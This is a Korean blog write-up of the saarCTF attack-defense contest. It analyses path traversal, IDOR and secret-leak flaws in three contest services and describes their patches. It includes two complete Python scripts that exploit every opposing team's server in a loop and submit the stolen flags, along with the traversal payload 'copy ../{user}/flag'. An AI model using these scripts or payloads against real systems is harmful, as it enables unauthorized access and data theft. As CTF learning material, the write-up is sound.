## 개요

SAS CTF 다녀와서 공방전에 목말라 있다가 해외 팀에서 준비한 온라인 공방전이 열리길래 참가했다.

[https://ctf.saarland/](https://ctf.saarland/)

어딘가 구수한 향기가 풍기는 공식 사이트

고수분들 초대하기엔 너무 마이너한 대회고 지인들은 흔치 않은 형식이라 그런지 꼬셔지지 않았다. 그래서 그냥 혼자 (+LLM) 분석 + 익스 + 패치까지 다 하느라 많은 문제를 다루진 못했다.

> 이 글에는 더 많은 사람들이 함께 A&D CTF를 즐겼으면 하는 마음도 담겨 있다.

## CTF 구성

룰적인 측면에선 SLA 제외하고는 SAS CTF와 크게 다르지 않았다. 공방전 CTF의 기초 룰은 SAS CTF 후기 글에 기록해 뒀다.

saarCTF에서 달랐던 부분은 SLA였다. SAS CTF는 플래그 점수에 SLA 성공 비율을 곱해서 점수를 산정했던 것과 다르게 saarCTF는 SLA 점수를 분리하고 틱마다 status가 up이면 점수를 추가하는 방식이었다.

그리고 온라인 대회라 네트워크 구성을 철저히 준비한게 티가 났다. 오프라인 대회는 준비된 네트워크에 랜선으로 연결하면 준비가 끝나지만, 원격 접속으로만 참여할 수 있기에 모든 환경을 고려한 것으로 보인다.

또한 각 문제별로 플래그 획득에 필요한 데이터도 제공되었다. 각 데이터가 어떻게 사용되는지는 문제를 분석해서 알아내야 한다.

## Writeup

총 8문제가 출제되었고, 익스 2문제, 패치 3문제에 성공했다. 아무래도 본인은 익스가 더 재밌다 보니 익스를 메인으로, 패치는 익스에 겸해서 수행했다.

### rceaas

#### Analysis

러스트라 처음엔 기겁하고 도망갔지만 사실상 처음 솔버가 나온 문제길래 집중해서 분석했다. 우선 기본적으로 유저마다 디렉토리를 생성해 샌드박스를 구축한다. 이때 유저의 비밀번호가 샌드박스 외부의 별도 디렉토리에 저장된다.

이후 문제 이름에서도 알 수 있듯이 RCE 서비스를 제공한다. 제공되는 명령어 셋은 다양하다.

여기서 무턱대고 취약점을 찾는 것이 아니라, SAS CTF때 배웠던 "attack data를 힌트로 사용하자" 규칙을 적용했다. 본인 서버에서 확인한 결과 attack.json에서 제공되는 값은 등록된 유저 명으로 확인되었다. 또한 해당 유저의 비밀번호에 플래그가 기록되어 있다. 결국 샌드박스를 탈출해 플래그를 읽어오면 익스가 가능한 문제로 파악이 가능하다.

Path Traversal이 가능한 부분을 찾다 보니 아래 코드가 눈에 보였다. 파일 출력용 명령어인 type은 입력한 파일 이름을 normalize_path_string() 함수로 정규화한다. 하지만 copy의 경우 입력값을 정규화하지 않고 마지막에 경로에 추가해 Path Traversal이 가능하다.

#### Exploit

결과적으로 attack.json의 유저 이름에 해당하는 비밀번호 파일을 copy해 type으로 출력하면 플래그를 확인할 수 있다.

마지막으로 틱마다 attack.json을 가져와 자동을 플래그를 수집하는 파이썬 스크립트를 돌려두면 점수가 올라가는 걸 확인할 수 있다. 자동 스크립트는 LLM을 이용해 임시로 제작하느라 스레드 개수 등 세부적인 설정을 하지 못했다. 다음에는 공격 가능한 VulnBox 개수만큼 스레드를 생성해 스레드를 최적화하면 더 좋을 것 같다.

```python
# Thank you GPT5
import requests
import json
from pwn import *
import logging
from concurrent.futures import ThreadPoolExecutor
import time

MAX_WORKERS = 100
SUBMIT_HOST = "10.32.250.2"
SUBMIT_PORT = 31337

logging.getLogger('pwnlib').setLevel('ERROR')

def process_ip(target_ip, users):
    for _, flag_user in users.items():
        try:
            p = remote(target_ip, 1835, timeout=3)
            p.sendlineafter(b"Enter your username: ", b"dks")
            p.sendlineafter(b"Enter your password: ", b"dks")
            
            payload = f"copy ../{flag_user}/flag 1.txt".encode()
            p.sendlineafter(b">", payload)
            
            p.sendlineafter(b">", b"type 1.txt")
            
            p.recvline()
            flag = p.recvline().strip()
            
            if flag.startswith(b"SAAR{") and flag.endswith(b"}"):
                print(f"\n[+] 플래그 발견! IP: {target_ip}, User: {flag_user}")
                print(f"[+] Flag: {flag.decode()}\n")
                p.close()
                
                submit = remote(SUBMIT_HOST, SUBMIT_PORT)
                submit.sendline(flag)
                print(f"[*] 제출 결과: {submit.recv().decode().strip()}")
                submit.close()
            else:
                p.close()
                break
        except Exception:
            continue

def run_attack_cycle():
    try:
        res = requests.get("https://scoreboard.ctf.saarland/api/attack.json")
        data = res.json()
        rceaas_targets = data.get('flag_ids').get('RCEaaS')
        print(f"[*] Target num : {len(rceaas_targets)}")
    except Exception as e:
        print(f"[!] {e}")
        return
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for target_ip, users in rceaas_targets.items():
            if target_ip == "10.32.1.2":
                continue
            executor.submit(process_ip, target_ip, users)
    
    print("[*] 현재 공격 주기의 모든 작업 제출이 완료되었습니다.")

if __name__ == "__main__":
    try:
        while True:
            print("="*50)
            print(f"[{time.ctime()}] 새로운 공격 주기를 시작합니다.")
            print("="*50)
            
            run_attack_cycle()
            
            print("\n" + "="*50)
            print(f"[{time.ctime()}] 공격 주기가 완료되었습니다. 3분 후 다음 주기를 시작합니다.")
            print("Ctrl+C를 눌러 프로그램을 종료할 수 있습니다.")
            print("="*50 + "\n")
            
            time.sleep(180)
            
    except KeyboardInterrupt:
        print("\n[*] 사용자의 요청으로 자동 공격 스크립트를 종료합니다.")
        exit(0)
```

패치는 입력값을 포함한 문자열을 정규화하도록 순서를 손보면 간단히 해결 가능하다.

#### ETC

번외로 attack.json에 데이터가 하나밖에 없어서 취약점이 하나인 문제라고 생각하고 넘어갔다가, 패치해도 계속 플래그가 따이길래 다시 보니 취약점이 하나 더 있었다. copy 말고 set 명령어를 이용해 USERNAME 환경변수 조작하고 call 명령어로 샌드박스를 탈출할 수 있다...!

익스까지 하진 못했지만, attack data 및 플래그가 하나라고 꼭 취약점이 하나인건 아니라는 사실을 배웠다.

### routerploit

#### Analysis

Attack data가 두 개 주어지는데, 그 중 하나가 제품 또는 계정 uuid 형식으로 주어진다. guid 인자를 받는 엔드포인트에 여기 저기 넣어보다 보니 account.php에서 플래그가 나온다...

취약점이라고 하기도 뭐하지만, 계정 정보를 보여줄 때 세션 등을 통해 guid를 로드하는 게 아니라 GET 인자에서 guid를 로드하도록 설정되어 있다. 이후 account.php는 해당 guid를 전적으로 신뢰하고 DB에서 Notes를 가져와 보여준다. 일종의 IDOR?

나머지 Attack Data의 취약점은 더 찾지 못했다.

#### Exploit

정말 쉽게 플래그를 얻었지만 꽤 시간이 지나도 다른 팀들이 패치를 하지 않아 점수를 많이 얻었다.

```python
# I LOV U GPT
import time
import requests, json, re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning
from pwn import *
import logging

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
logging.getLogger('pwnlib').setLevel('ERROR')

MAX_WORKERS = 300
CONNECT_TIMEOUT = 1.0
READ_TIMEOUT = 3.0

USERNAME = "dhwlakdy"
PASSWORD = "Zzzzzzzz1!"
FLAG_RE = re.compile(r"(SAAR\{[^\}]+\})", re.S)

def fetch_routerploit_map():
    try:
        s = requests.Session()
        s.verify = False
        s.headers.update({"Connection": "keep-alive", "User-Agent": "rt/1.0"})
        resp = s.get("https://scoreboard.ctf.saarland/api/attack.json", timeout=(1, 3))
        data = resp.json()
        return data.get("flag_ids", {}).get("Routerploit", {}) or {}
    except Exception as e:
        print(f"[!] scoreboard fetch failed: {e}")
        return {}

def get_all_uuids_for_ip(slots: dict):
    try:
        ordered = sorted(slots.items(), key=lambda kv: int(kv[0]))
    except Exception:
        ordered = list(slots.items())
    uuids = []
    for _, pair in ordered:
        uuid = pair[0] if isinstance(pair, list) and pair else None
        uuids.append(uuid)
    return uuids

def login_only(ip):
    sess = requests.Session()
    sess.verify = False
    sess.headers.update({"Connection": "keep-alive", "User-Agent": "rt/1.0"})
    try:
        lr = sess.post(
            f"https://{ip}/login.php",
            data={"username": USERNAME, "password": PASSWORD},
            timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
            allow_redirects=True,
        )
        login_ok = (200 <= lr.status_code < 400) and (
            "/account.php" in lr.url or
            "/index.php" in lr.url or
            lr.url.rstrip("/").endswith(ip)
        )
        if not login_ok:
            return None, {"ip": ip, "ok": False, "stage": "login", "code": lr.status_code, "final": getattr(lr, "url", None)}
        return sess, {"ip": ip, "ok": True, "stage": "done", "login_final": lr.url}
    except Exception as e:
        return None, {"ip": ip, "ok": False, "stage": "login", "error": str(e)}

def extract_flag_from_text(text: str):
    m = FLAG_RE.search(text or "")
    return m.group(1) if m else None

def visit_account_with_uuid(sess: requests.Session, ip: str, uuid: str):
    try:
        r = sess.get(f"https://{ip}/account.php?user_guid={uuid}",
                     timeout=(CONNECT_TIMEOUT, READ_TIMEOUT),
                     allow_redirects=True)
        flag = extract_flag_from_text(r.text)
        return {"ip": ip, "uuid": uuid, "status": r.status_code, "final": getattr(r, "url", None), "flag": flag}
    except Exception as e:
        return {"ip": ip, "uuid": uuid, "error": str(e)}

def process_ip(ip, slots):
    out = {"ip": ip, "hits": []}
    sess, login_res = login_only(ip)
    out["login"] = login_res
    if not (login_res and login_res.get("ok") and sess):
        return out
    
    uuids = get_all_uuids_for_ip(slots)
    for u in uuids:
        if not u:
            continue
        res = visit_account_with_uuid(sess, ip, u)
        out["hits"].append(res)
        if res.get("flag"):
            print(f"[FLAG] {ip} {u} -> {res['flag']}")
            try:
                p = remote("10.32.250.2", 31337, timeout=3)
                p.sendline(res['flag'].encode())
                print(f"[*] 제출 결과: {p.recv().decode().strip()}")
                p.close()
            except Exception:
                pass
    return out

def run_once():
    routerploit = fetch_routerploit_map()
    ips = list(routerploit.keys())
    print(f"[*] IP targets: {len(ips)}")
    summary = []
    
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futs = {ex.submit(process_ip, ip, routerploit.get(ip, {})): ip for ip in ips}
        for fut in as_completed(futs):
            ip = futs[fut]
            try:
                res = fut.result()
            except Exception as e:
                res = {"ip": ip, "error": f"unhandled: {e}"}
            summary.append(res)

if __name__ == "__main__":
    try:
        while True:
            print("="*60)
            print(f"[{time.ctime()}] cycle start")
            print("="*60)
            
            run_once()
            
            print(f"[{time.ctime()}] cycle end -> sleep 180s")
            time.sleep(180) 
    except KeyboardInterrupt:
        print("\n[*] stopped by user")
```

패치는 간단하게 guid를 인자가 아닌 사용자 세션에서만 가져오도록 수정했다.

### no-service

#### Analysis

두 종류의 저장소가 주어진다. 저장소들은 모두 파일 저장 시 초기에 설정된 secret 값과 파일마다 다른 uuid를 이용해 HMAC 토큰을 생성한다. 이후 파일 접근 시 생성했던 HMAC 토큰이 함께 제공되어야 파일을 읽을 수 있다.

이때 각 저장소는 HMAC에 사용되는 secret 값을 다르게 설정한다. 간단하게 하나는 저장소에 있는 secret.txt의 값, 나머지 하나는 서버 실행 시 인자로 주어진 값을 사용한다. 이때 인자로 주어지는 값은 startup.sh에서 openssl rand를 통해 생성된 랜덤 값이다.

attack.json에서는 읽어야 하는 플래그 파일의 key 값이 주어진다. 따라서 각 저장소의 secret 값을 알아낼 수만 있다면 HMAC 토큰을 계산해 플래그를 읽을 수 있다.

#### Exploit

아무리 봐도 취약점이 나올만한 부분이 없어 감을 못잡았었다. 하지만 결국 secret.txt 또는 프로세스의 명령줄 인자만 확인이 가능하면 플래그를 얻을 수 있다. 또한 모든 서버는 하나의 VulnBox에서 돌아간다. 즉, 굳이 해당 문제가 아니더라도 다른 문제를 통해 VulnBox에서 secret을 유출해 문제 해결에 사용할 수 있다!

이미 rceaas 익스에 성공해서 secret을 파일로 저장하는 저장소는 익스 가능했지만 너무 졸려서 더 진행하지는 못했다. secret.txt를 삭제하고 인자가 아닌 stdin으로 secret을 입력받는 방식으로 패치만 하고 종료했다.

## 후기

대회 중간 쯤 잠에 들어서 최종 48등까지 떨어지긴 했지만 중반에 20등대 후반까진 달성했다. 아마 패치한 문제들도 추가 취약점 찾아서 익스 가능한 부분이 있어서 점수가 더 떨어진 것 같다. 그래도 SAS CTF 본선에 비하면 훠~~~월씬 쉬워서 재밌게 즐길 수 있었다. SAS CTF때 배웠던 attack data 활용도 효과적으로 된 것 같아서 뿌듯하다.

그와중에 이번에도 1등은 SAS CTF 1등했던 `C4T BuT S4D`였다.
[https://github.com/C4T-BuT-S4D](https://github.com/C4T-BuT-S4D)
깃허브 확인해보니 익스 배포에 추가 인스턴스를 사용하는 등 공방전에 매우 진심인 팀이다. 혹시라도 A&D CTF에 관심있는 분들은 적극 참고해보면 좋을 것 같다.

공방전은 정말 재밌지만 준비하는 입장에서도 자원 소모가 심하고, 익숙하지 않은 형식이다보니 대중적이지도 않다. 많이 열리질 않으니 언젠가는 내가 직접 만들어 보는 것도 괜찮을 것 같다. 기존 CTF들도 대부분 이미 존재하는 플랫폼을 수정해서 사용하니 충분히 해볼만한 과제가 아닐까.
